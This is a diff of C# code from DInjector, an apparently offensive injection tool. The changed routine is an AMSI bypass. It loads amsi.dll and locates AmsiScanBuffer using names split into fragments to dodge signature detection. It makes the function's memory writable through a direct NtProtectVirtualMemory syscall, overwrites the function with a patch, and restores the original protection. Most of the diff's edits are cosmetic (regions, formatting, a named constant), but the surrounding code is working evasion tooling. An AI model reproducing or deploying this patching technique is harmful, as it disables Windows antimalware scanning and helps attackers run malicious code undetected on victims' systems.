@@ -52,15 +52,15 @@ namespace DInjector
         {
             try
             {
-                // -- GetProcAddress + LoadLibraryA ----------------------------------
+                #region GetProcAddress (LoadLibraryA)
 
                 // Parsing _PEB_LDR_DATA structure of kernel32.dll
                 IntPtr pkernel32 = DI.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
 
                 // Library to load
-                var aston = "am";
+                var aston  = "am";
                 var martin = "si";
-                var dll = ".dll";
+                var dll    = ".dll";
                 object[] LoadLibParams = {aston+martin+dll};
 
                 // Get LoadLibraryA address
@@ -70,7 +70,7 @@ namespace DInjector
                 var lib = (IntPtr)DI.DynamicInvoke.Generic.DynamicFunctionInvoke(pointer, typeof(LoadLibraryA), ref LoadLibParams);
 
                 // Function to patch
-                var Aston = "Am";
+                var Aston  = "Am";
                 var Martin = "siScan";
                 var Buffer = "Buffer";
                 object[] GetProcAddressParams = {lib, Aston+Martin+Buffer};
@@ -81,7 +81,9 @@ namespace DInjector
                 // Call GetProcAddress for the function mentioned above
                 var addr = (IntPtr)DI.DynamicInvoke.Generic.DynamicFunctionInvoke(pointer, typeof(GetProcAddress), ref GetProcAddressParams);
 
-                // -- NtProtectVirtualMemory -----------------------------------------
+                #endregion
+
+                #region NtProtectVirtualMemory (PAGE_READWRITE)
 
                 IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
                 NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
@@ -98,7 +100,7 @@ namespace DInjector
                     hProcess,
                     ref addr,
                     ref regionSize,
-                    0x40,
+                    DI.Data.Win32.WinNT.PAGE_READWRITE,
                     out oldProtect);
 
                 if (ntstatus == 0)
@@ -113,7 +115,9 @@ namespace DInjector
                 Console.WriteLine("(AM51) [>] Patching at address: " + string.Format("{0:X}", oldAddress.ToInt64()));
                 Marshal.Copy(patch, 0, oldAddress, patch.Length);
 
-                // -- NtProtectVirtualMemory -----------------------------------------
+                #endregion
+
+                #region NtProtectVirtualMemory (oldProtect)
 
                 // CleanUp permissions back to oldProtect
                 regionSize = (IntPtr)patch.Length;
@@ -133,6 +137,8 @@ namespace DInjector
                 {
                     Console.WriteLine($"(AM51) [-] NtProtectVirtualMemory: {ntstatus}");
                 }
+
+                #endregion
             }
             catch (Exception e)
             {
